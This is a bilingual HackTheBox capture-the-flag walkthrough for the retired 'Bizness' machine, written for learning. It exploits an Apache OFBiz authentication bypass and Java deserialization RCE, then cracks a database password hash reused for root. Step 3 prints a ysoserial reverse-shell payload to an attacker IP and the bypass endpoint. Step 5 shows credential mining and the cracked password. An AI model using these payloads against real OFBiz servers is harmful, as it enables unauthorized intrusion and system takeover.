# Bizness [Easy]

> **ES:** Máquina Linux fácil centrada en Apache OFBiz con RCE pre-autenticación y reutilización de credencial de base de datos para llegar a root.
> **EN:** Easy Linux machine focused on Apache OFBiz with pre-auth RCE and database credential reuse to reach root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | C4rm3l0 |
| **URL** | https://app.hackthebox.com/machines/Bizness |
| **IP lab** | 10.10.11.252 |
| **Fecha de resolución** | 2026-09-24 |

---

## Fuentes / Sources

- [IppSec: Bizness (video)](https://youtube.com/watch?v=VcxSqLEr3kY) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía RCE en OFBiz (CVE-2023-49070 / CVE-2023-51467) y craqueo de hash SHA-1 de la base Derby reutilizado como clave de root.
> **EN:** Get `user.txt` and `root.txt` via OFBiz RCE (CVE-2023-49070 / CVE-2023-51467) and cracking a Derby DB SHA-1 hash reused as the root password.

---

## Fuentes / Sources


## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] ffuf / feroxbuster
- [ ] ysoserial (`CommonsBeanutils1`) + base64
- [ ] pwncat-cs / nc (reverse shell)
- [ ] hashid + hashcat (`-m 120`) + rockyou.txt
- [ ] grep sobre ficheros Derby (`seg0/c*.dat`) + `ij` (Derby tools)

---

## Fuentes / Sources


## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo completo de puertos y registro del dominio `bizness.htb` en `/etc/hosts`.
> **EN:** Full port scan and registering the `bizness.htb` domain in `/etc/hosts`.

```bash
nmap -sC -sV -Pn 10.10.11.252 -oN nmap.txt
echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:** 22/tcp OpenSSH 8.4p1 Debian, 80/443/tcp nginx 1.18.0 (redirect a `https://bizness.htb/`), 40081/tcp tcpwrapped. OS Linux. Capturas de la página inicial en `images/` y en `img/image_20240110-171031.png`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** `ffuf` revela `/control`; `feroxbuster` amplía a `/partymgr/control` y `/marketing/control` (redirige a `https://bizness.htb/marketing/control/main`). El pie de página muestra `Powered by Apache OFBiz Release 18.12`, vulnerable a bypass de autenticación + deserialización Java en el endpoint XMLRPC.
> **EN:** `ffuf` reveals `/control`; `feroxbuster` extends to `/partymgr/control` and `/marketing/control` (redirects to `https://bizness.htb/marketing/control/main`). The footer shows `Powered by Apache OFBiz Release 18.12`, vulnerable to auth bypass + Java deserialization at the XMLRPC endpoint.

```bash
ffuf -u https://bizness.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 302
curl -sk https://bizness.htb/ | grep -io "ofbiz"
# Rutas: /partymgr/control, /marketing/control -> /marketing/control/main
```

**Resultado / Result:** Endpoint `/webtools/control/xmlrpc` expuesto; CVE-2023-49070 (relacionado con CVE-2023-51467) aplicable. Capturas de `/control` y del footer OFBiz en `images/`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Se genera payload ysoserial (`CommonsBeanutils1`), se codifica en base64 y se envía como objeto serializado dentro de una llamada XMLRPC `ProjectDiscovery` al endpoint con bypass (`;/?USERNAME=&PASSWORD=&requirePasswordChange=Y`). Alternativa: PoC `python3 exploit.py https://bizness.htb/ shell <IP>:<puerto>`.
> **EN:** Build a ysoserial payload (`CommonsBeanutils1`), base64-encode it and deliver it as a serialized object inside a `ProjectDiscovery` XMLRPC call to the bypassed endpoint (`;/?USERNAME=&PASSWORD=&requirePasswordChange=Y`). Alternative: PoC via `python3 exploit.py https://bizness.htb/ shell <IP>:<port>`.

```bash
nc -lvnp 9999 &
# generar payload (JDK 8) y codificarlo
jdk8 -jar ./tools/ysoserial-all.jar CommonsBeanutils1 "nc 10.10.16.45 9999 -e /bin/bash" | base64 | tr -d "\n"
# POST XML a https://bizness.htb/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y
# con <methodName>ProjectDiscovery</methodName> y el blob en <serializable>
# --- alternativa con PoC público ---
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
python3 exploit.py https://bizness.htb/ shell 10.10.14.17:443
```

**Resultado / Result:** Reverse shell como `ofbiz` en `/opt/ofbiz` (`ofbiz@bizness:/opt/ofbiz$ whoami` → `ofbiz`). `/etc/passwd` confirma `ofbiz` como único usuario interactivo además de root.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** El usuario `ofbiz` ya permite leer el home de la cuenta de servicio y el flag de usuario. No se pega el flag completo.
> **EN:** The `ofbiz` user can already read the service account home and the user flag. Full flag not pasted.

```bash
whoami  # ofbiz
ls -lh /home/ofbiz/
cat /home/ofbiz/user.txt  # formato: a6e1... (ofuscado)
```

**Resultado / Result:** `user.txt` leído como `ofbiz`.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** Sin SUID obvios (`find / -perm -u=s` solo binarios estándar; `getcap` solo `ping`). OFBiz usa base Derby embebida: se localiza `seg0` (`/opt/ofbiz/runtime/data/derby/ofbiz/seg0`), se mina con `grep` de `password` y aparece `Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"`. Se confirma vía `ij` que `OFBIZ.USER_LOGIN` (admin) guarda ese hash; se normaliza (`_`→`/`, `-`→`+`, base64→hex `b8fd3f41a541a435857a8f3e751cc3a91c174362`) y se craquea como SHA-1 con salt (`hashcat -m 120` = `sha1($salt.$pass)`), obteniendo `monkeybizness`, reutilizada vía `su` a root (credencial de laboratorio retirado).
> **EN:** No obvious SUID (`find / -perm -u=s` only standard binaries; `getcap` only `ping`). OFBiz uses an embedded Derby DB: locate `seg0` (`/opt/ofbiz/runtime/data/derby/ofbiz/seg0`), mine it with a `password` grep and find `Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"`. Confirm via `ij` that `OFBIZ.USER_LOGIN` (admin) stores that hash; normalize (`_`→`/`, `-`→`+`, base64→hex `b8fd3f41a541a435857a8f3e751cc3a91c174362`) and crack as salted SHA-1 (`hashcat -m 120` = `sha1($salt.$pass)`), getting `monkeybizness`, reused via `su` to root (retired-lab credential).

```bash
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
find /opt/ofbiz/ -name seg0
# /opt/ofbiz/runtime/data/derby/ofbiz/seg0 (+ ofbizolap, ofbiztenant)
cd /opt/ofbiz/runtime/data/derby/ofbiz/seg0
cat * | grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}'
# c54d0.dat:...:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
# --- confirmación con ij (Derby tools) ---
# ij> connect 'jdbc:derby:./ofbiz';
# ij> select USER_LOGIN_ID, CURRENT_PASSWORD, PASSWORD_HINT from OFBIZ.USER_LOGIN;
# admin | $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I | NULL
hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362  # -> sha1($salt.$pass), modo 120
hashcat -a 0 -m 120 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' rockyou.txt
# b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness
su        # clave reutilizada (admin -> root)
cat /root/root.txt  # formato: 1396... (ofuscado)
```

**Resultado / Result:** Técnica: credencial en base de datos + craqueo + reutilización (`su` a root). Captura del análisis Base64→hex en `images/`.

---

## Fuentes / Sources


## 🧠 Lo aprendido / Learned

> **ES:** Explotación de deserialización Java vía XMLRPC en OFBiz y flujo de transformación de hash propietario a formato craqueable.
> **EN:** Java deserialization exploitation via OFBiz XMLRPC and the flow for converting a proprietary hash into a crackable format.

- [ ] Auth-bypass + RCE pre-auth en Apache OFBiz (CVE-2023-49070 / CVE-2023-51467)
- [ ] Minería de credenciales en Derby (`seg0/*.dat`, tabla `OFBIZ.USER_LOGIN`) y craqueo SHA-1 con salt en hashcat
- [ ] Directorios grandes (~20 000 ficheros): buscar ficheros de BBDD/config en vez de revisar a mano

---

## Fuentes / Sources


## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy, notas crudas con nmap/ffuf/Derby/hashcat) — wither/nota migrada
- **Walkthrough de referencia:** Apache-OFBiz-Authentication-Bypass PoC — https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass — jakabakos (ver también PoC RCE https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC — abdoghazy2015)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## Fuentes / Sources


## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
